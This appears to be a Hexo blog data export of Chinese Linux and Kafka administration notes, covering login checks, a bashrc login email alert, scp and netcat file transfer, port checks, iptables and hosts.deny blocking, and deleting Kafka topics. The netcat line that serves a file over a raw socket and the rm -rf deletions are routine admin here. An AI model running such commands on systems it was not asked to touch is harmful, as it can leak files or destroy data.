class=\"line\">                . &quot;$i&quot;</span><br><span class=\"line\">            else</span><br><span class=\"line\">                . &quot;$i&quot; &gt;/dev/null</span><br><span class=\"line\">            fi</span><br><span class=\"line\">        fi</span><br><span class=\"line\">    done</span><br><span class=\"line\"></span><br><span class=\"line\">    unset i</span><br><span class=\"line\">    unset -f pathmunge</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#添加</span><br><span class=\"line\">echo &quot;some bitch has logged in your server&quot; | mail -s &quot;有人登录，快看&quot;  123456@qq.com</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>last命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">last</span><br><span class=\"line\">root     pts/3        192.168.207.1    Tue Oct 24 14:05   still logged in   </span><br><span class=\"line\">root     pts/2        192.168.207.1    Tue Oct 24 12:50   still logged in   </span><br><span class=\"line\">root     pts/1        192.168.207.1    Tue Oct 24 12:50   still logged in</span><br></pre></td></tr></table></figure></p>\n<p>last -h</p>\n<pre><code>last: invalid option -- &apos;h&apos;\nUsage: last [-num | -n num] [-f file] [-t YYYYMMDDHHMMSS] [-R] [-adioxFw] [username..] [tty..]\n</code></pre><p>cat /etc/profile<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># System wide environment and startup programs, for login setup</span><br><span class=\"line\"># Functions and aliases go in /etc/bashrc</span><br><span class=\"line\"></span><br><span class=\"line\"># It&apos;s NOT a good idea to change this file unless you know what you</span><br><span class=\"line\"># are doing. It&apos;s much better to create a custom.sh shell script in</span><br><span class=\"line\"># /etc/profile.d/ to make custom changes to your environment, as this</span><br><span class=\"line\"># will prevent the need for merging in future updates.</span><br></pre></td></tr></table></figure></p>\n<p>cat /etc/bashrc<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># System wide functions and aliases</span><br><span class=\"line\"># Environment stuff goes in /etc/profile</span><br><span class=\"line\"></span><br><span class=\"line\"># It&apos;s NOT a good idea to change this file unless you know what you</span><br><span class=\"line\"># are doing. It&apos;s much better to create a custom.sh shell script in</span><br><span class=\"line\"># /etc/profile.d/ to make custom changes to your environment, as this</span><br><span class=\"line\"># will prevent the need for merging in future updates.</span><br></pre></td></tr></table></figure></p>\n<p>vim  /etc/bashrc<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\">.......</span><br><span class=\"line\">    SHELL=/bin/bash</span><br><span class=\"line\">    # Only display echos from profile.d scripts if we are no login shell</span><br><span class=\"line\">    # and interactive - otherwise just process them to set envvars</span><br><span class=\"line\">    for i in /etc/profile.d/*.sh; do</span><br><span class=\"line\">        if [ -r &quot;$i&quot; ]; then</span><br><span class=\"line\">            if [ &quot;$PS1&quot; ]; then</span><br><span class=\"line\">                . &quot;$i&quot;</span><br><span class=\"line\">            else</span><br><span class=\"line\">                . &quot;$i&quot; &gt;/dev/null</span><br><span class=\"line\">            fi</span><br><span class=\"line\">        fi</span><br><span class=\"line\">    done</span><br><span class=\"line\"></span><br><span class=\"line\">    unset i</span><br><span class=\"line\">    unset -f pathmunge</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#添加</span><br><span class=\"line\">echo &quot;some bitch has logged in your server&quot; | mail -s &quot;有人登录，快看&quot;  123456@qq.com</span><br></pre></td></tr></table></figure></p>\n"},{"title":"用户","date":"2018-07-10T13:09:19.000Z","_content":"查看当前登录用户:\r\n\r\n    $:/ # who\r\n\r\n查看登录用户行为:\r\n\r\n    $:/ # w\r\n\r\n查看linfengfeiye用户执行任务情况\r\n\r\n    $:/ # w user","source":"_posts/Linux/用户.md","raw":"---\ntitle: 用户\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n查看当前登录用户:\r\n\r\n    $:/ # who\r\n\r\n查看登录用户行为:\r\n\r\n    $:/ # w\r\n\r\n查看linfengfeiye用户执行任务情况\r\n\r\n    $:/ # w user","slug":"Linux/用户","published":1,"updated":"2018-07-10T13:10:09.946Z","_id":"cjjedmhav005e0gtjkkqymf8v","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查看当前登录用户:</p>\n<pre><code>$:/ # who\n</code></pre><p>查看登录用户行为:</p>\n<pre><code>$:/ # w\n</code></pre><p>查看linfengfeiye用户执行任务情况</p>\n<pre><code>$:/ # w user\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>查看当前登录用户:</p>\n<pre><code>$:/ # who\n</code></pre><p>查看登录用户行为:</p>\n<pre><code>$:/ # w\n</code></pre><p>查看linfengfeiye用户执行任务情况</p>\n<pre><code>$:/ # w user\n</code></pre>"},{"title":"文件互传","date":"2018-07-10T13:09:19.000Z","_content":"#### scp命令\r\n1.本机->远程服务器\r\n\r\n    scp  -r /home/name/hello  root@192.168.0.1:/home/name\r\n/home/name/hello为源目录，test2为目标目录，root@192.168.0.1为远程服务器的用户名和ip地址。\r\n\r\n-r 表示递归发送，不加可以发送一个文件\r\n\r\n2.远程服务器->本机\r\n\r\n\r\n    scp  -r root@192.168.0.1:/home/name/hello0 /home/name/hello1\r\nroot@192.168.0.1为远程服务器的用户名和ip地址，/home/name/hello0为源目录，/home/name/hello1\r\n\r\n#### netcat工具\r\n需要安装\r\n\r\n发送\r\n\r\n    nc -l 12345 < ttt\r\n\r\n接收\r\n    \r\n    nc -n ip 12345 > ttt","source":"_posts/Linux/文件互传.md","raw":"---\ntitle: 文件互传\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n#### scp命令\r\n1.本机->远程服务器\r\n\r\n    scp  -r /home/name/hello  root@192.168.0.1:/home/name\r\n/home/name/hello为源目录，test2为目标目录，root@192.168.0.1为远程服务器的用户名和ip地址。\r\n\r\n-r 表示递归发送，不加可以发送一个文件\r\n\r\n2.远程服务器->本机\r\n\r\n\r\n    scp  -r root@192.168.0.1:/home/name/hello0 /home/name/hello1\r\nroot@192.168.0.1为远程服务器的用户名和ip地址，/home/name/hello0为源目录，/home/name/hello1\r\n\r\n#### netcat工具\r\n需要安装\r\n\r\n发送\r\n\r\n    nc -l 12345 < ttt\r\n\r\n接收\r\n    \r\n    nc -n ip 12345 > ttt","slug":"Linux/文件互传","published":1,"updated":"2018-07-10T13:10:09.942Z","_id":"cjjedmhaw005g0gtj4j2puli6","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"scp命令\"><a href=\"#scp命令\" class=\"headerlink\" title=\"scp命令\"></a>scp命令</h4><p>1.本机-&gt;远程服务器</p>\n<pre><code>scp  -r /home/name/hello  root@192.168.0.1:/home/name\n</code></pre><p>/home/name/hello为源目录，test2为目标目录，<a href=\"mailto:root@192.168.0.1\" target=\"_blank\" rel=\"noopener\">root@192.168.0.1</a>为远程服务器的用户名和ip地址。</p>\n<p>-r 表示递归发送，不加可以发送一个文件</p>\n<p>2.远程服务器-&gt;本机</p>\n<pre><code>scp  -r root@192.168.0.1:/home/name/hello0 /home/name/hello1\n</code></pre><p><a href=\"mailto:root@192.168.0.1\" target=\"_blank\" rel=\"noopener\">root@192.168.0.1</a>为远程服务器的用户名和ip地址，/home/name/hello0为源目录，/home/name/hello1</p>\n<h4 id=\"netcat工具\"><a href=\"#netcat工具\" class=\"headerlink\" title=\"netcat工具\"></a>netcat工具</h4><p>需要安装</p>\n<p>发送</p>\n<pre><code>nc -l 12345 &lt; ttt\n</code></pre><p>接收</p>\n<pre><code>nc -n ip 12345 &gt; ttt\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"scp命令\"><a href=\"#scp命令\" class=\"headerlink\" title=\"scp命令\"></a>scp命令</h4><p>1.本机-&gt;远程服务器</p>\n<pre><code>scp  -r /home/name/hello  root@192.168.0.1:/home/name\n</code></pre><p>/home/name/hello为源目录，test2为目标目录，<a href=\"mailto:root@192.168.0.1\" target=\"_blank\" rel=\"noopener\">root@192.168.0.1</a>为远程服务器的用户名和ip地址。</p>\n<p>-r 表示递归发送，不加可以发送一个文件</p>\n<p>2.远程服务器-&gt;本机</p>\n<pre><code>scp  -r root@192.168.0.1:/home/name/hello0 /home/name/hello1\n</code></pre><p><a href=\"mailto:root@192.168.0.1\" target=\"_blank\" rel=\"noopener\">root@192.168.0.1</a>为远程服务器的用户名和ip地址，/home/name/hello0为源目录，/home/name/hello1</p>\n<h4 id=\"netcat工具\"><a href=\"#netcat工具\" class=\"headerlink\" title=\"netcat工具\"></a>netcat工具</h4><p>需要安装</p>\n<p>发送</p>\n<pre><code>nc -l 12345 &lt; ttt\n</code></pre><p>接收</p>\n<pre><code>nc -n ip 12345 &gt; ttt\n</code></pre>"},{"title":"端口","date":"2018-07-10T13:09:19.000Z","_content":"查看端口使用情况\r\n```\r\nnetstat -apn \r\nnetstat -apn | grep 25\r\n```\r\n查看端口是否对外开放\r\n\r\nnc\r\n```\r\nnc ip 25\r\nnc 127.0.0.1 25 #不是对外开放状态\r\n\r\n[root~]# nc 127.0.0.1 25\r\n220 hq.localdomain ESMTP Postfix\r\n\r\n[root ~]# nc 1.2.3.4 25\r\nNcat: Connection refused.\r\n```\r\ntelnet\r\n\r\n        ...\r\n通过iptables禁用\r\n```\r\n\"sudo iptables -A INPUT -p tcp --dport $PORT -j DROP\"\r\n\"sudo iptables -A OUTPUT -p tcp --dport $PORT -j DROP\"\r\n```","source":"_posts/Linux/端口.md","raw":"---\ntitle: 端口\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n查看端口使用情况\r\n```\r\nnetstat -apn \r\nnetstat -apn | grep 25\r\n```\r\n查看端口是否对外开放\r\n\r\nnc\r\n```\r\nnc ip 25\r\nnc 127.0.0.1 25 #不是对外开放状态\r\n\r\n[root~]# nc 127.0.0.1 25\r\n220 hq.localdomain ESMTP Postfix\r\n\r\n[root ~]# nc 1.2.3.4 25\r\nNcat: Connection refused.\r\n```\r\ntelnet\r\n\r\n        ...\r\n通过iptables禁用\r\n```\r\n\"sudo iptables -A INPUT -p tcp --dport $PORT -j DROP\"\r\n\"sudo iptables -A OUTPUT -p tcp --dport $PORT -j DROP\"\r\n```","slug":"Linux/端口","published":1,"updated":"2018-07-10T13:10:09.950Z","_id":"cjjedmhax005i0gtj8terne7s","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查看端口使用情况</p>\n<pre><code>netstat -apn \nnetstat -apn | grep 25\n</code></pre><p>查看端口是否对外开放</p>\n<p>nc</p>\n<pre><code>nc ip 25\nnc 127.0.0.1 25 #不是对外开放状态\n\n[root~]# nc 127.0.0.1 25\n220 hq.localdomain ESMTP Postfix\n\n[root ~]# nc 1.2.3.4 25\nNcat: Connection refused.\n</code></pre><p>telnet</p>\n<pre><code>...\n</code></pre><p>通过iptables禁用</p>\n<pre><code>&quot;sudo iptables -A INPUT -p tcp --dport $PORT -j DROP&quot;\n&quot;sudo iptables -A OUTPUT -p tcp --dport $PORT -j DROP&quot;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>查看端口使用情况</p>\n<pre><code>netstat -apn \nnetstat -apn | grep 25\n</code></pre><p>查看端口是否对外开放</p>\n<p>nc</p>\n<pre><code>nc ip 25\nnc 127.0.0.1 25 #不是对外开放状态\n\n[root~]# nc 127.0.0.1 25\n220 hq.localdomain ESMTP Postfix\n\n[root ~]# nc 1.2.3.4 25\nNcat: Connection refused.\n</code></pre><p>telnet</p>\n<pre><code>...\n</code></pre><p>通过iptables禁用</p>\n<pre><code>&quot;sudo iptables -A INPUT -p tcp --dport $PORT -j DROP&quot;\n&quot;sudo iptables -A OUTPUT -p tcp --dport $PORT -j DROP&quot;\n</code></pre>"},{"title":"连接","date":"2018-07-10T13:09:19.000Z","_content":"实例：ln -s /home/gamestat    /gamestat\r\n \r\nlinux下的软链接类似于windows下的快捷方式\r\n \r\nln -s a b 中的 a 就是源文件，b是链接文件名,其作用是当进入b目录，实际上是链接进入了a目录\r\n如上面的示例，当我们执行命令   cd /gamestat/的时候  实际上是进入了 /home/gamestat/\r\n \r\n值得注意的是执行命令的时候,应该是a目录已经建立，目录b没有建立。我最开始操作的是也把b目录给建立了，结果就不对了\r\n \r\n删除软链接：\r\n   rm -rf  b  注意不是rm -rf  b/","source":"_posts/Linux/连接.md","raw":"---\ntitle: 连接\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n实例：ln -s /home/gamestat    /gamestat\r\n \r\nlinux下的软链接类似于windows下的快捷方式\r\n \r\nln -s a b 中的 a 就是源文件，b是链接文件名,其作用是当进入b目录，实际上是链接进入了a目录\r\n如上面的示例，当我们执行命令   cd /gamestat/的时候  实际上是进入了 /home/gamestat/\r\n \r\n值得注意的是执行命令的时候,应该是a目录已经建立，目录b没有建立。我最开始操作的是也把b目录给建立了，结果就不对了\r\n \r\n删除软链接：\r\n   rm -rf  b  注意不是rm -rf  b/","slug":"Linux/连接","published":1,"updated":"2018-07-10T13:10:09.951Z","_id":"cjjedmhay005k0gtjs68x30di","comments":1,"layout":"post","photos":[],"link":"","content":"<p>实例：ln -s /home/gamestat    /gamestat</p>\n<p>linux下的软链接类似于windows下的快捷方式</p>\n<p>ln -s a b 中的 a 就是源文件，b是链接文件名,其作用是当进入b目录，实际上是链接进入了a目录<br>如上面的示例，当我们执行命令   cd /gamestat/的时候  实际上是进入了 /home/gamestat/</p>\n<p>值得注意的是执行命令的时候,应该是a目录已经建立，目录b没有建立。我最开始操作的是也把b目录给建立了，结果就不对了</p>\n<p>删除软链接：<br>   rm -rf  b  注意不是rm -rf  b/</p>\n","site":{"data":{}},"excerpt":"","more":"<p>实例：ln -s /home/gamestat    /gamestat</p>\n<p>linux下的软链接类似于windows下的快捷方式</p>\n<p>ln -s a b 中的 a 就是源文件，b是链接文件名,其作用是当进入b目录，实际上是链接进入了a目录<br>如上面的示例，当我们执行命令   cd /gamestat/的时候  实际上是进入了 /home/gamestat/</p>\n<p>值得注意的是执行命令的时候,应该是a目录已经建立，目录b没有建立。我最开始操作的是也把b目录给建立了，结果就不对了</p>\n<p>删除软链接：<br>   rm -rf  b  注意不是rm -rf  b/</p>\n"},{"title":"禁止IP登录访问","date":"2018-07-10T13:09:19.000Z","_content":"对于能过xinetd程序启动的网络服务，比如ftp telnet，我们就可以修改/etc/hosts.allow和/etc/hosts.deny的配制，来许可或者拒绝哪些IP、主机、用户可以访问。\r\n\r\n比如我们在 /etc/hosts.allow中加入\r\n\r\n    all:218.24.129.\r\n\r\n这样就会允许来自218.24.129.*域的所有的客户来访问。这只是举个例子，实际上，系统默认状态 下，都是能用这些网络服的\r\n\r\n如果我们在 /etc/hosts.deny中加入，就限制了来自218.24.129.*域的所有的所有的IP。\r\n\r\n    all:218.24.129.\r\n\r\n如果我们在 /etc/hosts.deny中加入\r\n\r\n    all:218.24.129.134\r\n\r\n这样就限制了所有在218.24.129.134中的所有的用户的访问。\r\n\r\n当hosts.allow和 host.deny相冲突时，以hosts.allow设置优化。\r\n\r\n设置好后，要重新启动\r\n```\r\n/etc/rc.d/init.d/xinetd restart\r\n/etc/rc.d/init.d/network restart\r\n```\r\n \r\n\r\n不是任何服务程序都能使用TCP_wrappers的，例如使用命令ldd /usr/sbin/sshd，如果输出中有libwrap，则说明可以使用TCP_wrappers, 即该服务可以使用/etc/hosts.allow和/etc/hosts.deny,如果输出没有libwrap则不可使用\r\n\r\n```\r\nvi /etc/hosts.deny\r\n#\r\n# hosts.deny    This file contains access rules which are used to\r\n#               deny connections to network services that either use\r\n#               the tcp_wrappers library or that have been\r\n#               started through a tcp_wrappers-enabled xinetd.\r\n#\r\n#               The rules in this file can also be set up in\r\n#               /etc/hosts.allow with a 'deny' option instead.\r\n#\r\n#               See 'man 5 hosts_options' and 'man 5 hosts_access'\r\n#               for information on rule syntax.\r\n#               See 'man tcpd' for information on tcp_wrappers\r\n#\r\nall:218.24.129.134\r\nall:59.63.166.81\r\n#all:114.67.147.214\r\n```","source":"_posts/Linux/禁止IP登录访问.md","raw":"---\ntitle: 禁止IP登录访问\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n对于能过xinetd程序启动的网络服务，比如ftp telnet，我们就可以修改/etc/hosts.allow和/etc/hosts.deny的配制，来许可或者拒绝哪些IP、主机、用户可以访问。\r\n\r\n比如我们在 /etc/hosts.allow中加入\r\n\r\n    all:218.24.129.\r\n\r\n这样就会允许来自218.24.129.*域的所有的客户来访问。这只是举个例子，实际上，系统默认状态 下，都是能用这些网络服的\r\n\r\n如果我们在 /etc/hosts.deny中加入，就限制了来自218.24.129.*域的所有的所有的IP。\r\n\r\n    all:218.24.129.\r\n\r\n如果我们在 /etc/hosts.deny中加入\r\n\r\n    all:218.24.129.134\r\n\r\n这样就限制了所有在218.24.129.134中的所有的用户的访问。\r\n\r\n当hosts.allow和 host.deny相冲突时，以hosts.allow设置优化。\r\n\r\n设置好后，要重新启动\r\n```\r\n/etc/rc.d/init.d/xinetd restart\r\n/etc/rc.d/init.d/network restart\r\n```\r\n \r\n\r\n不是任何服务程序都能使用TCP_wrappers的，例如使用命令ldd /usr/sbin/sshd，如果输出中有libwrap，则说明可以使用TCP_wrappers, 即该服务可以使用/etc/hosts.allow和/etc/hosts.deny,如果输出没有libwrap则不可使用\r\n\r\n```\r\nvi /etc/hosts.deny\r\n#\r\n# hosts.deny    This file contains access rules which are used to\r\n#               deny connections to network services that either use\r\n#               the tcp_wrappers library or that have been\r\n#               started through a tcp_wrappers-enabled xinetd.\r\n#\r\n#               The rules in this file can also be set up in\r\n#               /etc/hosts.allow with a 'deny' option instead.\r\n#\r\n#               See 'man 5 hosts_options' and 'man 5 hosts_access'\r\n#               for information on rule syntax.\r\n#               See 'man tcpd' for information on tcp_wrappers\r\n#\r\nall:218.24.129.134\r\nall:59.63.166.81\r\n#all:114.67.147.214\r\n```","slug":"Linux/禁止IP登录访问","published":1,"updated":"2018-07-10T13:10:09.949Z","_id":"cjjedmhay005m0gtjyj8ntlys","comments":1,"layout":"post","photos":[],"link":"","content":"<p>对于能过xinetd程序启动的网络服务，比如ftp telnet，我们就可以修改/etc/hosts.allow和/etc/hosts.deny的配制，来许可或者拒绝哪些IP、主机、用户可以访问。</p>\n<p>比如我们在 /etc/hosts.allow中加入</p>\n<pre><code>all:218.24.129.\n</code></pre><p>这样就会允许来自218.24.129.*域的所有的客户来访问。这只是举个例子，实际上，系统默认状态 下，都是能用这些网络服的</p>\n<p>如果我们在 /etc/hosts.deny中加入，就限制了来自218.24.129.*域的所有的所有的IP。</p>\n<pre><code>all:218.24.129.\n</code></pre><p>如果我们在 /etc/hosts.deny中加入</p>\n<pre><code>all:218.24.129.134\n</code></pre><p>这样就限制了所有在218.24.129.134中的所有的用户的访问。</p>\n<p>当hosts.allow和 host.deny相冲突时，以hosts.allow设置优化。</p>\n<p>设置好后，要重新启动</p>\n<pre><code>/etc/rc.d/init.d/xinetd restart\n/etc/rc.d/init.d/network restart\n</code></pre><p>不是任何服务程序都能使用TCP_wrappers的，例如使用命令ldd /usr/sbin/sshd，如果输出中有libwrap，则说明可以使用TCP_wrappers, 即该服务可以使用/etc/hosts.allow和/etc/hosts.deny,如果输出没有libwrap则不可使用</p>\n<pre><code>vi /etc/hosts.deny\n#\n# hosts.deny    This file contains access rules which are used to\n#               deny connections to network services that either use\n#               the tcp_wrappers library or that have been\n#               started through a tcp_wrappers-enabled xinetd.\n#\n#               The rules in this file can also be set up in\n#               /etc/hosts.allow with a &apos;deny&apos; option instead.\n#\n#               See &apos;man 5 hosts_options&apos; and &apos;man 5 hosts_access&apos;\n#               for information on rule syntax.\n#               See &apos;man tcpd&apos; for information on tcp_wrappers\n#\nall:218.24.129.134\nall:59.63.166.81\n#all:114.67.147.214\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>对于能过xinetd程序启动的网络服务，比如ftp telnet，我们就可以修改/etc/hosts.allow和/etc/hosts.deny的配制，来许可或者拒绝哪些IP、主机、用户可以访问。</p>\n<p>比如我们在 /etc/hosts.allow中加入</p>\n<pre><code>all:218.24.129.\n</code></pre><p>这样就会允许来自218.24.129.*域的所有的客户来访问。这只是举个例子，实际上，系统默认状态 下，都是能用这些网络服的</p>\n<p>如果我们在 /etc/hosts.deny中加入，就限制了来自218.24.129.*域的所有的所有的IP。</p>\n<pre><code>all:218.24.129.\n</code></pre><p>如果我们在 /etc/hosts.deny中加入</p>\n<pre><code>all:218.24.129.134\n</code></pre><p>这样就限制了所有在218.24.129.134中的所有的用户的访问。</p>\n<p>当hosts.allow和 host.deny相冲突时，以hosts.allow设置优化。</p>\n<p>设置好后，要重新启动</p>\n<pre><code>/etc/rc.d/init.d/xinetd restart\n/etc/rc.d/init.d/network restart\n</code></pre><p>不是任何服务程序都能使用TCP_wrappers的，例如使用命令ldd /usr/sbin/sshd，如果输出中有libwrap，则说明可以使用TCP_wrappers, 即该服务可以使用/etc/hosts.allow和/etc/hosts.deny,如果输出没有libwrap则不可使用</p>\n<pre><code>vi /etc/hosts.deny\n#\n# hosts.deny    This file contains access rules which are used to\n#               deny connections to network services that either use\n#               the tcp_wrappers library or that have been\n#               started through a tcp_wrappers-enabled xinetd.\n#\n#               The rules in this file can also be set up in\n#               /etc/hosts.allow with a &apos;deny&apos; option instead.\n#\n#               See &apos;man 5 hosts_options&apos; and &apos;man 5 hosts_access&apos;\n#               for information on rule syntax.\n#               See &apos;man tcpd&apos; for information on tcp_wrappers\n#\nall:218.24.129.134\nall:59.63.166.81\n#all:114.67.147.214\n</code></pre>"},{"title":"kafka删除消息","date":"2018-07-10T13:09:19.000Z","_content":"- #### 如果设置了可删除直接命令删除\n配置\n\nserver.properties\n\ndelete.topic.enable=true\n```\n#删除test\nkafka-topics  --delete --zookeeper hs01:2181  --topic test\n```\n- #### zookeeper客户端删除\n```\n#进入客户端\n./zookeeper-shell.sh hs01:2181\n\n#删除\nrmr /brokers/topics/test\nrmr /admin/delete_topics/test\n```\n\n- #### kafka日志删除\n找到日志目录\n```\nkafka\n############################# Log Basics #############################\n\n# A comma seperated list of directories under which to store log files\nlog.dirs=/opt/rt/kafka/kafka-logs\n\n#删除\nrm -rf /opt/rt/kafka/kafka-logs/test-0\n```","source":"_posts/kafka/kafka删除消息.md","raw":"---\ntitle: kafka删除消息\ndate: 2018-07-10 21:09:19\ntags: kafka\n---\n- #### 如果设置了可删除直接命令删除\n配置\n\nserver.properties\n\ndelete.topic.enable=true\n```\n#删除test\nkafka-topics  --delete --zookeeper hs01:2181  --topic test\n```\n- #### zookeeper客户端删除\n```\n#进入客户端\n./zookeeper-shell.sh hs01:2181\n\n#删除\nrmr /brokers/topics/test\nrmr /admin/delete_topics/test\n```\n\n- #### kafka日志删除\n找到日志目录\n```\nkafka\n############################# Log Basics #############################\n\n# A comma seperated list of directories under which to store log files\nlog.dirs=/opt/rt/kafka/kafka-logs\n\n#删除\nrm -rf /opt/rt/kafka/kafka-logs/test-0\n```","slug":"kafka/kafka删除消息","published":1,"updated":"2018-07-10T13:10:09.917Z","_id":"cjjedmhaz005o0gtjbhm2k317","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"如果设置了可删除直接命令删除\"><a href=\"#如果设置了可删除直接命令删除\" class=\"headerlink\" title=\"如果设置了可删除直接命令删除\"></a>如果设置了可删除直接命令删除</h4>配置</li>\n</ul>\n<p>server.properties</p>\n<p>delete.topic.enable=true<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#删除test</span><br><span class=\"line\">kafka-topics  --delete --zookeeper hs01:2181  --topic test</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"zookeeper客户端删除\"><a href=\"#zookeeper客户端删除\" class=\"headerlink\" title=\"zookeeper客户端删除\"></a>zookeeper客户端删除</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#进入客户端</span><br><span class=\"line\">./zookeeper-shell.sh hs01:2181</span><br><span class=\"line\"></span><br><span class=\"line\">#删除</span><br><span class=\"line\">rmr /brokers/topics/test</span><br><span class=\"line\">rmr /admin/delete_topics/test</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"kafka日志删除\"><a href=\"#kafka日志删除\" class=\"headerlink\" title=\"kafka日志删除\"></a>kafka日志删除</h4><p>找到日志目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kafka</span><br><span class=\"line\">############################# Log Basics #############################</span><br><span class=\"line\"></span><br><span class=\"line\"># A comma seperated list of directories under which to store log files</span><br><span class=\"line\">log.dirs=/opt/rt/kafka/kafka-logs</span><br><span class=\"line\"></span><br><span class=\"line\">#删除</span><br><span class=\"line\">rm -rf /opt/rt/kafka/kafka-logs/test-0</span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"如果设置了可删除直接命令删除\"><a href=\"#如果设置了可删除直接命令删除\" class=\"headerlink\" title=\"如果设置了可删除直接命令删除\"></a>如果设置了可删除直接命令删除</h4>配置</li>\n</ul>\n<p>server.properties</p>\n<p>delete.topic.enable=true<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#删除test</span><br><span class=\"line\">kafka-topics  --delete --zookeeper hs01:2181  --topic test</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"zookeeper客户端删除\"><a href=\"#zookeeper客户端删除\" class=\"headerlink\" title=\"zookeeper客户端删除\"></a>zookeeper客户端删除</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#进入客户端</span><br><span class=\"line\">./zookeeper-shell.sh hs01:2181</span><br><span class=\"line\"></span><br><span class=\"line\">#删除</span><br><span class=\"line\">rmr /brokers/topics/test</span><br><span class=\"line\">rmr /admin/delete_topics/test</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"kafka日志删除\"><a href=\"#kafka日志删除\" class=\"headerlink\" title=\"kafka日志删除\"></a>kafka日志删除</h4><p>找到日志目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kafka</span><br><span class=\"line\">############################# Log Basics #############################</span><br><span class=\"line\"></span><br><span class=\"line\"># A comma seperated list of directories under which to store log files</span><br><span class=\"line\">log.dirs=/opt/rt/kafka/kafka-logs</span><br><span class=\"line\"></span><br><span class=\"line\">#删除</span><br><span class=\"line\">rm -rf /opt/rt/kafka/kafka-logs/test-0</span><br></pre></td></tr></table></figure></li>\n</ul>\n"},{"title":"kafka命令","date":"2018-07-10T13:09:19.000Z","_content":"查看topic\n\n    kafka-topics.sh --list --zookeeper localhost:2181\n\n查看某一topic下的消息\n\n    kafka-console-consumer.sh --zookeeper localhost:2181 --topic account --from-beginning\n    \n删除topic\n```\n./zookeeper-shell.sh hs03:2181\n\nrmr /brokers/topics/{topic_name}\nrmr /admin/delete_topics/{topic_name}\n```\n创建消息\n\n    kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n    \n发送消息\n\n    kafka-console-producer.sh --broker-list hs03:9092 --topic hh\n    \n查看topic信息\n```\n    kafka-topics.sh --describe  --zookeeper hs03:2181\n    \n    Topic:T1\tPartitionCount:1\tReplicationFactor:1\tConfigs:\n\tTopic: T1\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3\n    